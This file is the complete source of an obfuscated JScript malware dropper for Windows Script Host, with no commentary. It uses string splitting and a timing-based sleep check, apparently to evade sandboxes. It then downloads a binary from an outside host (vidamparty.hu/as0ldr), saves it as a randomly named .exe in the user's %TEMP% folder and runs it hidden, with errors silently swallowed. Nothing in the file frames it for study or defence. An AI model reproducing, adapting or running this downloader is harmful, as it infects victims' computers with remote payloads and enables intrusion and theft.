var MZ = false;
var FZ = "Create"+"Object";
var B1 = function N() {return WScript[FZ]("WScript"+".Shell");}(), OU = 11;
var LB = "MSXML2"+".XMLHTTP";
var K0 = 2;
var W = K0 - 2;
function F(N0){B1["Run"](N0, W, W);};
function ZI(){return LB + "";};
function S(OR, RD){W = W * 1; return OR - RD;};
function M(){return FZ;};
/*@cc_on
  @if (@_win32 || @_win64)
    MZ = true;
  @end
@*/
if (MZ)
{
var B = "";
function HO(){return 22;};
var ET = 0; var LK = 0;
function JD()
{
var GV = new this["Date"]();
var XO = GV["getUTCMilliseconds"]();
WScript["Sleep"](HO());
var GV = new this["Date"]();
var BI = GV["getUTCMilliseconds"]();
WScript["Sleep"](HO());
var GV = new this["Date"]();
var LF = GV["getUTCMilliseconds"]();
var ET = "CW";
ET = S(BI, XO);
var LK = "IC";
LK = S(LF, BI);
B = "open";
return S(ET, LK);
}
var HD = false;
var R = false;
for (var U = W; U < HO() * 1; U++){if (JD() != W){
HD = true; 
LK = "31" + 11 * ET + LK; 
R = true; 
break;
}}
function I() {return ((HD == true) && (HD == R)) ? 1 : W;};
if (HD && I() && R){
function Y() {return B1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jQygpSxzYBM.ex" + "e";};
 L = ZI();
 C = WScript[FZ](L);
 var IW = 1;
do { 
	for (;IW;){
	try {
		if (IW == 1)
		{
			C[B]("GET", "http://vidamparty.hu/as0ldr", false);
			C["send"]();
			WU = "Sleep";
			IW = 2;
		}
		WScript[WU](HO() + 120); 
		if (C["readystate"] < 2 * 2) continue;
		IW = W;
		function K(B0) {var A = (1, 2, 3, 4, 5, B0); return A;};
		H = WScript[M()]("ADODB.Stream");
		L = H;
		L[B]();
		L["type"] = K(1);
		L["write"](C["ResponseBody"]);
		H["position"] = K(W);
		L["Save" + "ToFile"](Y(), 2);
		H["cl"+"ose"]();
		VU = Y();
		F(VU);
	} catch(QX){};};
}while (IW);
}
}

